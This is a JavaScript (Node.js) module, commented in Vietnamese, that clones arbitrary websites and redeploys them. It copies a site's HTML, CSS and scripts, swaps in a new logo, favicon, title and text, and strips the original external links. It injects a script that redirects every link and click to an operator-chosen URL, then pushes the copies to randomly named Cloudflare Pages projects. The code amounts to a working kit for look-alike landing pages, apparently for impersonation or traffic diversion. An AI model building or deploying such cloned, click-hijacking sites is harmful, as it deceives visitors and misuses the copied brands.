import fs from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";
import AdmZip from "adm-zip";
import { ACTIVE_TEMPLATES } from "./templates.js";
import { createPagesProject, deployToAllPagesInstances } from "./cloudflare.js";

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const CLONED_ROOT = process.platform === "win32" ? "C:\\Landingpages\\CLONED" : "/var/www/Landingpages/CLONED";

if (!fs.existsSync(CLONED_ROOT)) {
  try {
    fs.mkdirSync(CLONED_ROOT, { recursive: true });
  } catch {}
}

const DYNAMIC_ROUTER_SCRIPT = `
  <!-- DYNAMIC ROUTER BY WEB HUB -->
  <script>
    window.DYNAMIC_TARGET = "";
    (function() {
      try {
        fetch('/domains.json?v=' + Date.now())
          .then(function(r) { return r.json(); })
          .then(function(dj) {
            if (!dj) return;
            var h = (window.location.hostname || '').toLowerCase().replace(/^www\\./, '');
            var entry = dj[h] || dj['www.' + h] || dj[window.location.hostname];
            if (entry) {
              var target = entry.main_url || entry.url || entry.link;
              if (target) {
                window.DYNAMIC_TARGET = target;
                document.querySelectorAll('a').forEach(function(a) {
                  if (!a.getAttribute('data-keep-link')) {
                    a.href = target;
                    a.target = '_blank';
                  }
                });
              }
            }
          }).catch(function(){});
      } catch(e){}

      document.addEventListener('click', function(e) {
        var a = e.target.closest('a');
        if (a && window.DYNAMIC_TARGET && !a.getAttribute('data-keep-link')) {
          e.preventDefault();
          window.open(window.DYNAMIC_TARGET, '_blank');
        }
      }, true);
    })();
  </script>
`;

/**
 * Helper lưu trữ file từ Base64 hoặc URL
 */
async function saveMediaAsset(dataOrUrl, destFolder, defaultFilename) {
  if (!dataOrUrl || typeof dataOrUrl !== "string") return null;

  try {
    // 1. Nếu là Base64 Data URL (data:image/png;base64,...)
    if (dataOrUrl.startsWith("data:image/")) {
      const match = dataOrUrl.match(/^data:image\/([a-zA-Z0-9+]+);base64,(.+)$/);
      if (match) {
        let ext = match[1].toLowerCase();
        if (ext === "svg+xml") ext = "svg";
        if (ext === "jpeg") ext = "jpg";
        if (ext === "x-icon" || ext === "vnd.microsoft.icon") ext = "ico";

        const filename = defaultFilename.includes(".") ? defaultFilename.replace(/\.[^.]+$/, `.${ext}`) : `${defaultFilename}.${ext}`;
        const filePath = path.join(destFolder, filename);
        const buffer = Buffer.from(match[2], "base64");
        fs.writeFileSync(filePath, buffer);
        return filename;
      }
    }

    // 2. Nếu là URL Web (http:// hoặc https://)
    if (dataOrUrl.startsWith("http://") || dataOrUrl.startsWith("https://")) {
      const res = await fetch(dataOrUrl).catch(() => null);
      if (res && res.ok) {
        const buffer = Buffer.from(await res.arrayBuffer());
        let ext = "png";
        const cType = res.headers.get("content-type") || "";
        if (cType.includes("svg")) ext = "svg";
        else if (cType.includes("webp")) ext = "webp";
        else if (cType.includes("jpeg") || cType.includes("jpg")) ext = "jpg";
        else if (cType.includes("icon") || cType.includes("ico")) ext = "ico";

        const filename = defaultFilename.includes(".") ? defaultFilename.replace(/\.[^.]+$/, `.${ext}`) : `${defaultFilename}.${ext}`;
        const filePath = path.join(destFolder, filename);
        fs.writeFileSync(filePath, buffer);
        return filename;
      }
    }
  } catch (err) {
    console.warn(`[Scraper] Lỗi lưu media asset (${defaultFilename}):`, err.message);
  }

  return null;
}

export async function cloneWebsite({
  url,
  templateName = "",
  domain = "",
  targetUrl = "",
  logoData = null,
  faviconData = null,
  pageTitle = "",
  textReplacements = [],
  onProgress = null,
}) {
  const normUrl = url.startsWith("http://") || url.startsWith("https://") ? url : `https://${url}`;
  const parsed = new URL(normUrl);
  const safeHost = parsed.hostname.replace(/[^a-zA-Z0-9]/g, "_");
  const templateId = `lp_clone_${safeHost}_${Date.now().toString(36)}`;
  const pagesProject = `lp-cloned-${safeHost.slice(0, 15).toLowerCase()}-${Math.random().toString(36).slice(2, 6)}`;
  const folderPath = path.join(CLONED_ROOT, templateId);

  if (onProgress) onProgress(15, `Đang kết nối và tải mã nguồn từ ${normUrl}...`);

  fs.mkdirSync(folderPath, { recursive: true });
  fs.mkdirSync(path.join(folderPath, "css"), { recursive: true });
  fs.mkdirSync(path.join(folderPath, "js"), { recursive: true });
  fs.mkdirSync(path.join(folderPath, "images"), { recursive: true });

  const res = await fetch(normUrl, {
    headers: {
      "User-Agent":
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
      Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    },
  });

  if (!res.ok) {
    throw new Error(`Không thể tải trang web (HTTP ${res.status}: ${res.statusText})`);
  }

  let html = await res.text();
  if (onProgress) onProgress(35, "Đang bóc tách CSS, JavaScript, Hình ảnh và làm sạch mã nguồn...");

  // 1. Bóc tách & tải các CSS styles
  const cssMatches = [...html.matchAll(/<link[^>]+rel=["']stylesheet["'][^>]+href=["']([^"']+)["']/gi)];
  let cssCount = 0;
  const savedCssFiles = [];
  for (const m of cssMatches) {
    try {
      const href = m[1];
      const cssUrl = new URL(href, normUrl).href;
      const cssRes = await fetch(cssUrl).catch(() => null);
      if (cssRes && cssRes.ok) {
        const cssText = await cssRes.text();
        const localCssName = `style_${cssCount++}.css`;
        const localCssPath = path.join(folderPath, "css", localCssName);
        fs.writeFileSync(localCssPath, cssText, "utf8");
        savedCssFiles.push(localCssPath);
        html = html.replace(m[0], `<link rel="stylesheet" href="css/${localCssName}">`);
      }
    } catch {}
  }

  // 2. Bóc tách & tải các JavaScript scripts
  const jsMatches = [...html.matchAll(/<script[^>]+src=["']([^"']+)["'][^>]*><\/script>/gi)];
  let jsCount = 0;
  const savedJsFiles = [];
  for (const m of jsMatches) {
    try {
      const src = m[1];
      if (src.startsWith("http://") || src.startsWith("https://") || src.startsWith("/")) {
        const jsUrl = new URL(src, normUrl).href;
        const jsRes = await fetch(jsUrl).catch(() => null);
        if (jsRes && jsRes.ok) {
          const jsText = await jsRes.text();
          const localJsName = `script_${jsCount++}.js`;
          const localJsPath = path.join(folderPath, "js", localJsName);
          fs.writeFileSync(localJsPath, jsText, "utf8");
          savedJsFiles.push(localJsPath);
          html = html.replace(m[0], `<script src="js/${localJsName}"></script>`);
        }
      }
    } catch {}
  }

  if (onProgress) onProgress(50, "Đang áp dụng tùy chỉnh: Thay Logo, Favicon & Text toàn trang...");

  // 3. TÙY CHỈNH THAY THẾ LOGO
  if (logoData) {
    const savedLogo = await saveMediaAsset(logoData, path.join(folderPath, "images"), "brand_logo.png");
    if (savedLogo) {
      const logoRelPath = `images/${savedLogo}`;
      // Thay thế các thẻ <img> chứa từ khoá logo/brand/header-logo
      let replacedLogoCount = 0;
      html = html.replace(/<img([^>]*?)src=["']([^"']+)["']([^>]*?)>/gi, (match, p1, oldSrc, p2) => {
        const fullAttrs = `${p1} ${oldSrc} ${p2}`.toLowerCase();
        if (
          fullAttrs.includes("logo") ||
          fullAttrs.includes("brand") ||
          fullAttrs.includes("header-img") ||
          fullAttrs.includes("navbar-brand")
        ) {
          replacedLogoCount++;
          // Xoá srcset nếu có để tránh ảnh cũ ghi đè
          const cleanP1 = p1.replace(/srcset=["'][^"']*["']/gi, "");
          const cleanP2 = p2.replace(/srcset=["'][^"']*["']/gi, "");
          return `<img${cleanP1}src="${logoRelPath}"${cleanP2} data-custom-logo="true">`;
        }
        return match;
      });

      // Nếu không tìm thấy class/src logo rõ ràng, tiêm thêm style override hỗ trợ
      html = html.replace(
        "</head>",
        `  <style>
    .custom-brand-logo, [class*="logo"] img, header img:first-of-type {
      content: url('${logoRelPath}') !important;
      max-height: 80px;
      object-fit: contain;
    }
  </style>\n</head>`
      );
    }
  }

  // 4. TÙY CHỈNH THAY THẾ FAVICON
  if (faviconData) {
    const savedFavicon = await saveMediaAsset(faviconData, path.join(folderPath, "images"), "favicon.png");
    if (savedFavicon) {
      const favRelPath = `images/${savedFavicon}`;
      // Xoá các thẻ favicon cũ
      html = html.replace(/<link[^>]+rel=["'](?:shortcut )?icon["'][^>]*>/gi, "");
      // Tiêm thẻ favicon mới vào <head>
      const favTag = `  <link rel="icon" type="image/png" href="${favRelPath}">\n  <link rel="shortcut icon" href="${favRelPath}">\n`;
      if (html.includes("</head>")) {
        html = html.replace("</head>", `${favTag}</head>`);
      } else {
        html = `${favTag}${html}`;
      }
    }
  }

  // 5. TÙY CHỈNH THAY THẾ TIÊU ĐỀ WEBSITE (Page Title)
  if (pageTitle && pageTitle.trim()) {
    const cleanTitle = pageTitle.trim();
    if (/<title[^>]*>.*?<\/title>/is.test(html)) {
      html = html.replace(/<title[^>]*>.*?<\/title>/is, `<title>${cleanTitle}</title>`);
    } else if (html.includes("</head>")) {
      html = html.replace("</head>", `  <title>${cleanTitle}</title>\n</head>`);
    }

    // Cập nhật thẻ OpenGraph / Meta Title
    html = html.replace(/<meta[^>]+property=["']og:title["'][^>]+content=["'][^"']*["'][^>]*>/gi, `<meta property="og:title" content="${cleanTitle}">`);
    html = html.replace(/<meta[^>]+name=["']twitter:title["'][^>]+content=["'][^"']*["'][^>]*>/gi, `<meta name="twitter:title" content="${cleanTitle}">`);
  }

  // 6. TÙY CHỈNH THAY THẾ TEXT / TỪ KHOÁ TOÀN TRANG (HTML, CSS, JS)
  if (Array.isArray(textReplacements) && textReplacements.length > 0) {
    for (const item of textReplacements) {
      if (item && item.find && typeof item.find === "string" && item.find.trim()) {
        const findText = item.find.trim();
        const replaceText = item.replace !== undefined ? String(item.replace) : "";

        // Thay trong HTML
        html = html.split(findText).join(replaceText);

        // Thay trong các file CSS đã tải
        for (const cssFile of savedCssFiles) {
          try {
            if (fs.existsSync(cssFile)) {
              let cContent = fs.readFileSync(cssFile, "utf8");
              if (cContent.includes(findText)) {
                cContent = cContent.split(findText).join(replaceText);
                fs.writeFileSync(cssFile, cContent, "utf8");
              }
            }
          } catch {}
        }

        // Thay trong các file JS đã tải
        for (const jsFile of savedJsFiles) {
          try {
            if (fs.existsSync(jsFile)) {
              let jContent = fs.readFileSync(jsFile, "utf8");
              if (jContent.includes(findText)) {
                jContent = jContent.split(findText).join(replaceText);
                fs.writeFileSync(jsFile, jContent, "utf8");
              }
            }
          } catch {}
        }
      }
    }
  }

  // 7. TIÊM DYNAMIC ROUTER VÀO <HEAD>
  if (html.includes("</head>")) {
    html = html.replace("</head>", `${DYNAMIC_ROUTER_SCRIPT}\n</head>`);
  } else if (html.includes("<body")) {
    html = html.replace("<body", `${DYNAMIC_ROUTER_SCRIPT}\n<body`);
  } else {
    html = `${DYNAMIC_ROUTER_SCRIPT}\n${html}`;
  }

  // Xóa các link cứng target ban đầu (biến thành # để Dynamic Router xử lý)
  html = html.replace(/href=["']https?:\/\/[^"']+["']/gi, 'href="#"');

  // Ghi file index.html
  fs.writeFileSync(path.join(folderPath, "index.html"), html, "utf8");

  // 8. Tạo file domains.json & config.js ban đầu
  const initialDomains = {};
  if (domain && domain.includes(".")) {
    const cleanDom = domain.toLowerCase().trim().replace(/^www\./, "");
    initialDomains[cleanDom] = {
      main_url: targetUrl || normUrl,
      url: targetUrl || normUrl,
      link: targetUrl || normUrl,
    };
    initialDomains[`www.${cleanDom}`] = initialDomains[cleanDom];
  }

  fs.writeFileSync(path.join(folderPath, "domains.json"), JSON.stringify(initialDomains, null, 2), "utf8");
  fs.writeFileSync(
    path.join(folderPath, "config.js"),
    `window.DOMAIN_CONFIG = ${JSON.stringify(initialDomains, null, 2)};\n`,
    "utf8"
  );

  // 9. TẠO FILE ZIP ĐỂ NGƯỜI DÙNG TẢI TRỌN BỘ SOURCE CODE VỀ MÁY
  let zipFilename = `${templateId}.zip`;
  let zipPath = path.join(folderPath, zipFilename);
  try {
    const zip = new AdmZip();
    zip.addLocalFolder(folderPath);
    zip.writeZip(zipPath);
  } catch (zErr) {
    console.warn(`[Scraper] Cảnh báo tạo file ZIP:`, zErr.message);
  }

  if (onProgress) onProgress(75, "Đang đăng ký mẫu mới vào hệ thống Cloudflare Pages...");

  const templateEntry = {
    id: templateId,
    name: templateName || `VIP Clone: ${parsed.hostname} (${new Date().toLocaleDateString("vi-VN")})`,
    title: templateName || `VIP Clone: ${parsed.hostname}`,
    folder: templateId,
    path: folderPath,
    pagesProject,
    cnameTarget: `${pagesProject}.pages.dev`,
    sampleDomain: parsed.hostname,
    sampleUrl: normUrl,
    totalDomains: domain ? 1 : 0,
    brand: "CLONED",
    brandLabel: "MẪU CLONE VIP",
    isCloned: true,
    zipUrl: `/api/templates/${templateId}/download`,
    createdAt: new Date().toISOString(),
  };

  ACTIVE_TEMPLATES.unshift(templateEntry);

  if (onProgress) onProgress(90, `Đang khởi tạo Cloudflare Pages project [${pagesProject}]...`);

  // Tạo Pages project và deploy lên Cloudflare Pages
  try {
    await createPagesProject(pagesProject).catch((err) => {
      console.warn(`[Scraper] Project creation notice:`, err.message);
    });
    await deployToAllPagesInstances(pagesProject, folderPath).catch((err) => {
      console.warn(`[Scraper] Initial deploy warning for ${pagesProject}:`, err.message);
    });
  } catch {}

  if (onProgress) onProgress(100, "Đã clone, thay thế logo/text & tối ưu hoá mã nguồn thành công!");

  return {
    template: templateEntry,
    folderPath,
    pagesProject,
    zipPath,
  };
}
